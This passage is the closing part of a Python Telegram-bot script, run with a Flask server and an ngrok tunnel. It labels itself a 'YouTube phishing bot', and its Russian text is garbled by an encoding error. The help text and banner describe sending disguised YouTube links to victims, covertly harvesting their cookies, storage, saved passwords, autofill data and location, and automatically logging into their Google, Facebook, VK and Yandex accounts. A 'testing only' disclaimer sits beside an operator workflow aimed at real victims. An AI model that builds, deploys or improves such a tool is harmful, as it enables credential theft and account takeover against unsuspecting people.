1. –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä: /start_ngrok
2. –ü–æ–ª—É—á–∏—Ç–µ URL: /get_url
3. –û—Ç–∫—Ä–æ–π—Ç–µ URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ
4. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
5. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É
6. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ
7. –ü–æ–ª—É—á–∞–π—Ç–µ –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

üîê *–ß—Ç–æ —Å–æ–±–∏—Ä–∞–µ—Ç—Å—è:*
‚Ä¢ –í—Å–µ cookies –±—Ä–∞—É–∑–µ—Ä–∞
‚Ä¢ LocalStorage –∏ SessionStorage
‚Ä¢ –°–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∏ –ª–æ–≥–∏–Ω—ã
‚Ä¢ –î–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ–æ—Ä–º
‚Ä¢ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
‚Ä¢ IP –∞–¥—Ä–µ—Å –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è

üöÄ *–ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò–ô –í–•–û–î:*
‚Ä¢ –°–∏—Å—Ç–µ–º–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤—Ö–æ–¥–∏—Ç –≤ –∞–∫–∫–∞—É–Ω—Ç—ã –Ω–∞ –í–ê–®–ï–ú —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–æ–±—Ä–∞–Ω–Ω—ã–µ cookies –∏ –ø–∞—Ä–æ–ª–∏
‚Ä¢ –î–µ–ª–∞–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç—ã —É—Å–ø–µ—à–Ω—ã—Ö –≤—Ö–æ–¥–æ–≤
‚Ä¢ –†–∞–±–æ—Ç–∞–µ—Ç –¥–ª—è Google, Facebook, VK, –Ø–Ω–¥–µ–∫—Å –∏ –¥—Ä.

‚ö° *–û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:*
‚Ä¢ –í–∏–¥–µ–æ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—Å—è –∫–∞–∫ –Ω–∞ YouTube
‚Ä¢ –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
‚Ä¢ –ñ–µ—Ä—Ç–≤–µ –Ω–µ –Ω—É–∂–Ω–æ –Ω–∏—á–µ–≥–æ –¥–µ–ª–∞—Ç—å
‚Ä¢ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –≤ –±–∞–∑—É

üîß *–û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /start_ngrok - –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
‚Ä¢ /stop_ngrok - –û—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞
‚Ä¢ /get_url - –ü–æ–ª—É—á–∏—Ç—å URL —Å–µ—Ä–≤–µ—Ä–∞
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã
‚Ä¢ /my_links - –ú–æ–∏ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∏
‚Ä¢ /data [ID] - –ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /auto_login [ID] - –ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ–≤—Ö–æ–¥–∞

‚ö†Ô∏è *–í–ê–ñ–ù–û:*
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!
‚Ä¢ –í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è
‚Ä¢ –ê–≤—Ç–æ–≤—Ö–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ –≤–∞—à–µ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ
‚Ä¢ –ù–µ –Ω–∞—Ä—É—à–∞–π—Ç–µ –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å—Å—Ç–≤–æ
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"‚ö†Ô∏è *–û—à–∏–±–∫–∞ –≤ –±–æ—Ç–µ:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

# ========== –ó–ê–ü–£–°–ö –°–ò–°–¢–ï–ú–´ ==========
def run_flask():
    """–ó–∞–ø—É—Å–∫ Flask —Å–µ—Ä–≤–µ—Ä–∞"""
    try:
        logger.info(f"Starting Flask server on port {FLASK_PORT}")
        app.run(
            host='0.0.0.0',
            port=FLASK_PORT,
            debug=False,
            use_reloader=False,
            threaded=True
        )
    except Exception as e:
        logger.error(f"Flask server error: {e}")

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø—É—Å–∫–∞"""
    global telegram_app
    
    print("=" * 70)
    print("ü§ñ YOUTUBE PHISHING BOT - –ü–û–õ–ù–´–ô –ö–û–ú–ü–õ–ï–ö–° –° –ê–í–¢–û–í–•–û–î–û–ú")
    print("=" * 70)
    print()
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("‚ùå –û–®–ò–ë–ö–ê: –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω BOT_TOKEN!")
        print("–ü–æ–ª—É—á–∏—Ç–µ —É @BotFather –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –≤ –∫–æ–¥ (—Å—Ç—Ä–æ–∫–∞ 22)")
        sys.exit(1)
    
    if NGROK_AUTH_TOKEN == "YOUR_NGROK_TOKEN_HERE":
        print("‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω NGROK_AUTH_TOKEN!")
        print("–ü–æ–ª—É—á–∏—Ç–µ –Ω–∞ ngrok.com –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –≤ –∫–æ–¥ (—Å—Ç—Ä–æ–∫–∞ 23)")
        print("–ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç")
        print("–ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –±–µ–∑ ngrok...")
    
    print("‚úÖ –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞")
    print(f"üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: {ADMIN_ID}")
    print(f"üåê –ü–æ—Ä—Ç Flask: {FLASK_PORT}")
    print()
    
    # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫–∏
    os.makedirs("screenshots", exist_ok=True)
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    time.sleep(2)  # –î–∞–µ–º Flask –≤—Ä–µ–º—è –Ω–∞ –∑–∞–ø—É—Å–∫
    
    print("‚úÖ Flask —Å–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É", FLASK_PORT)
    print("üîó –õ–æ–∫–∞–ª—å–Ω—ã–π URL: http://localhost:8080")
    print()
    
    # –°–æ–∑–¥–∞–µ–º Telegram –±–æ—Ç–∞
    try:
        telegram_app = Application.builder().token(BOT_TOKEN).build()
        
        # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
        telegram_app.add_handler(CommandHandler("start", start_command))
        telegram_app.add_handler(CommandHandler("start_ngrok", start_ngrok_command))
        telegram_app.add_handler(CommandHandler("stop_ngrok", stop_ngrok_command))
        telegram_app.add_handler(CommandHandler("get_url", get_url_command))
        telegram_app.add_handler(CommandHandler("stats", stats_command))
        telegram_app.add_handler(CommandHandler("my_links", my_links_command))
        telegram_app.add_handler(CommandHandler("auto_login", auto_login_command))
        telegram_app.add_handler(CommandHandler("data", data_command))
        telegram_app.add_handler(CommandHandler("help", start_command))
        
        # Inline –∫–Ω–æ–ø–∫–∏
        telegram_app.add_handler(CallbackQueryHandler(button_handler))
        
        # –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫
        telegram_app.add_error_handler(error_handler)
        
        print("‚úÖ Telegram –±–æ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω")
        print()
        print("=" * 70)
        print("üöÄ –°–ò–°–¢–ï–ú–ê –ì–û–¢–û–í–ê –ö –†–ê–ë–û–¢–ï!")
        print("=" * 70)
        print()
        print("üí° –ò–ù–°–¢–†–£–ö–¶–ò–Ø:")
        print("1. –ù–∞–ø–∏—à–∏—Ç–µ –±–æ—Ç—É /start")
        print("2. –ù–∞–∂–º–∏—Ç–µ '–ó–∞–ø—É—Å—Ç–∏—Ç—å ngrok' –∏–ª–∏ /start_ngrok")
        print("3. –ü–æ–ª—É—á–∏—Ç–µ URL —á–µ—Ä–µ–∑ /get_url")
        print("4. –û—Ç–∫—Ä–æ–π—Ç–µ URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ")
        print("5. –°–æ–∑–¥–∞–π—Ç–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É")
        print()
        print("‚ö° –û–°–û–ë–ï–ù–ù–û–°–¢–ò –°–ò–°–¢–ï–ú–´:")
        print("‚Ä¢ YouTube –≤–∏–¥–µ–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –∫–∞–∫ –Ω–∞—Å—Ç–æ—è—â–µ–µ")
        print("‚Ä¢ –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ")
        print("‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ –≤ Google, Facebook, VK –∏ –¥—Ä.")
        print("‚Ä¢ –°–∫—Ä–∏–Ω—à–æ—Ç—ã —É—Å–ø–µ—à–Ω—ã—Ö –≤—Ö–æ–¥–æ–≤")
        print("‚Ä¢ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –≤ –±–∞–∑—É")
        print()
        print("üìÅ –°–æ–∑–¥–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:")
        print("‚Ä¢ youtube_phishing.db - –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö SQLite")
        print("‚Ä¢ youtube_phishing.log - –õ–æ–≥–∏ —Å–∏—Å—Ç–µ–º—ã")
        print("‚Ä¢ screenshots/ - –°–∫—Ä–∏–Ω—à–æ—Ç—ã —É—Å–ø–µ—à–Ω—ã—Ö –≤—Ö–æ–¥–æ–≤")
        print()
        print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!")
        print("    –í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è –∏ –æ—Ç—Å–ª–µ–∂–∏–≤–∞—é—Ç—Å—è.")
        print("=" * 70)
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
        telegram_app.run_polling(allowed_updates=Update.ALL_UPDATES)
        
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
